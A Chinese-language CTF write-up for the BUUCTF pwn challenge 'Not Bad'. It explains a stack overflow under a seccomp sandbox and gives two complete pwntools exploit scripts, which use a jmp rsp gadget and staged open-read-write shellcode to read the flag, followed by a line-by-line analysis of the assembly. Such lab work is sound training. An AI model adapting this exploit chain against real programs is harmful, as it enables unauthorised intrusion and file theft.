# [极客大挑战 2019]Not Bad+orw 手写shell加跳转jmp

由于已经把pwn的大部分基础学完了那么就开始刷题

这里我们开始尝试写一个buu上的题目

我们先看他的保护

![image-20250421174112768](..\images\image-20250421174112768.png)

并且同样还要看一下ida

![image-20250421174228017](..\images\image-20250421174228017.png)

这里我们可以明白一个有着要给栈溢出

![image-20250421174306892](..\images\image-20250421174306892.png)

在这里我们可以明白这个程序堆数据进行了一个shabox的加了因此我们要用工具看一下他的特定保护

![image-20250421174556074](..\images\image-20250421174556074.png)

这里我们可以看到他只允许使用read，write，open和exit函数因此我们只能使用orw的方法来进行一个攻击

因此我们先编写脚本

由于我们要构造一个shellcode因此我们要提前早到一个可以执行和写入的一个地方

因此我们要使用gdb工具来进行一个查看orw的位置

![image-20250421175217714](..\images\image-20250421175217714.png)

从这里我们可以知道我们在这个栈位置上可以写如两个地方的shellcode位置因此我们可以网0x12300的位置写入这个是一个固定的位置是由mmap函数在main中进行一个设置因此往这里写入我们就不用泄露栈的地址了

因此我们编写脚本

exp

```python
from pwn import *
# io = remote("node5.buuoj.cn",28983)
context.arch="amd64"
io = process("/home/fofa/bad")
mmap = 0x123000

orw_payload = shellcraft.open("./flag")
orw_payload += shellcraft.read(3,mmap,0x50)
orw_payload += shellcraft.write(1,mmap,0x50)



jmp_rsp = 0x400A01
payload = asm(shellcraft.read(0, mmap, 0x100)) + asm('mov rax,0x123000;call rax')
payload = payload.ljust(0x28, b'\x00')
payload += p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp')#返回地址要到
io.recvuntil('Easy shellcode, have fun!')

gdb.attach(io)

io.sendline(payload)

shellcode=asm(orw_payload)
io.sendline(shellcode)

io.interactive()


```

这里的shellcode我们先构造一个读写执行的位置我们要向0x123000的位置读入并且我们写入的orw的位置也在这个位置因此我们要去这个位置进行要去这个位置去获取程序，因此我们要对buf的位置进行一个shellcode的跳转，跳到我们的构造好的数据地址去

其中后面的jmp_rsp+asm的数据就是一个栈迁移的一种新方法

通过jmp去控制rsp的位置因此我们可以获得数据

但是这个可以是可以手动构造shellcode这里附上exp脚本

```python
 1 from pwn import *
 2 context.arch='amd64'
 3 context.log_level='debug'
 4 
 5 s=remote('node4.buuoj.cn',26979)
 6 #s=process('./bad')
 7 
 8 jmp_rsp=0x400a01
 9 shellcode1='''
10     xor rdi, rdi
11     mov rsi, 0x123000
12     mov rdx, 0x100
13     mov rax, 0
14     syscall
15     mov rax, 0x123000
16     call rax
17 '''
18 
19 shellcode2='''
20     mov rdi, 0x67616c662f2e  //这个是.\flag由于小端序存储的倒着写的 gafl\.的16进制表示。
21     push rdi
22     mov rdi, rsp//这个是一个是调用open的函数调用号他的函数调用号为也就是rax为2
23     mov rsi, 0
24     mov rdx, 0
25     mov rax, 2
26     syscall
27     mov rdi, 3
28     mov rsi, rsp
29     mov rdx, 0x100
30     mov rax, 0
31     syscall
32     mov rdi, 1
33     mov rsi, rsp
34     mov edx, 0x100
35     mov rax, 1
36     syscall
37 '''
38 payload=asm(shellcode1)
39 payload=payload.ljust(0x28,b'\x00')
40 payload+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp')
41 s.sendline(payload)
42 
43 s.send(asm(shellcode2))
44 
45 s.interactive()
```



---

## shellcode分析

这段代码是一个简单的shellcode，用于在Linux环境下通过系统调用（`syscall`）打开文件并读取内容后输出。以下是对这段代码的逐行分析：

### 1. 文件路径准备

assembly

复制

```assembly
mov rdi, 0x67616c662f2e
```

- 将文件路径 `.\flag` 的16进制表示（小端序）存入寄存器 `rdi`。
- 小端序存储时，`.\flag` 的16进制表示为 `67616c662f2e`，即 `gafl\.`。

assembly

复制

```assembly
push rdi
```

- 将 `rdi` 的内容（即文件路径）压入栈中。

assembly

复制

```assembly
mov rdi, rsp
```

- 将栈指针 `rsp` 的值存入 `rdi`，此时 `rdi` 指向栈顶，即文件路径的地址。

### 2. 打开文件

assembly

复制

```assembly
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall
```

- 这里调用系统调用 `open`（`sys_open`，系统调用号为 `2`）。
  - `rdi`：文件路径（栈顶地址，即 `.\flag`）。
  - `rsi`：文件打开模式（`0` 表示只读模式）。
  - `rdx`：文件权限（`0`，在只读模式下通常不需要设置）。
  - `rax`：系统调用号 `2`。
- 调用完成后，文件描述符会存放在 `rax` 中。

### 3. 读取文件内容

assembly

复制

```assembly
mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall
```

- 这里调用系统调用 `read`（`sys_read`，系统调用号为 `0`）。
  - `rdi`：文件描述符（`3`，假设 `open` 调用成功，文件描述符为 `3`）。
  - `rsi`：缓冲区地址（栈顶地址，用于存放读取的数据）。
  - `rdx`：读取的字节数（`0x100`，即 256 字节）。
  - `rax`：系统调用号 `0`。
- 调用完成后，读取的字节数会存放在 `rax` 中，文件内容被存放在栈顶。

### 4. 输出内容

assembly

复制

```assembly
mov rdi, 1
mov rsi, rsp
mov edx, 0x100
mov rax, 1
syscall
```

- 这里调用系统调用 `write`（`sys_write`，系统调用号为 `1`）。
  - `rdi`：文件描述符（`1`，表示标准输出）。
  - `rsi`：缓冲区地址（栈顶地址，即读取的文件内容）。
  - `edx`：写入的字节数（`0x100`，即 256 字节）。
  - `rax`：系统调用号 `1`。
- 调用完成后，文件内容会被输出到标准输出（通常是终端）。